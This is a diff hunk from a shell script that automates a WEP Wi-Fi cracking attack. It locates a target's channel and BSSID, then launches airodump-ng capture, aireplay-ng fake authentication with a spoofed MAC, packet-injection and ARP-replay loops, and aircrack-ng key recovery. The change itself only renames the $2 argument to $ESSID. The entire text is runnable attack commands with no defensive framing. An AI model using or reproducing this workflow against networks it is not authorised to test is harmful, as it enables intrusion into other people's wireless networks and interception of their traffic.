@@ -69,16 +69,16 @@ else
 	CH=$(echo "$essid_scanned" | tr ";" "$" | cut -d$ -f6)
 	BSSID=$(echo "$essid_scanned" | tr ";" "$" | cut -d$ -f4)
 
-	echo "Found $2 in channel $CH !"
+	echo "Found $ESSID in channel $CH !"
 	echo "BSSID=$BSSID"
 
-	gnome-terminal -x sh -c "airodump-ng -t WEP -c $CH -w $2 --bssid $BSSID mon0" &
+	gnome-terminal -x sh -c "airodump-ng -t WEP -c $CH -w $ESSID --bssid $BSSID mon0" &
 
 	command0="aireplay-ng -1 6000 -q 10 -o 1 -e $ESSID -a $BSSID -h $FAKE_MAC mon0"
 	command1="aireplay-ng -1 6 -e $ESSID -a $BSSID -h $FAKE_MAC mon0"
 	command2="aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID -h $FAKE_MAC -F mon0"
 	command3="aireplay-ng -3 -b $BSSID -h $FAKE_MAC mon0"
-	command4="aircrack-ng $2*.cap"
+	command4="aircrack-ng $ESSID*.cap"
 
 	gnome-terminal -x sh -c "while true;do $command0;done" &
 	gnome-terminal -x sh -c "while true;do $command2;done" &
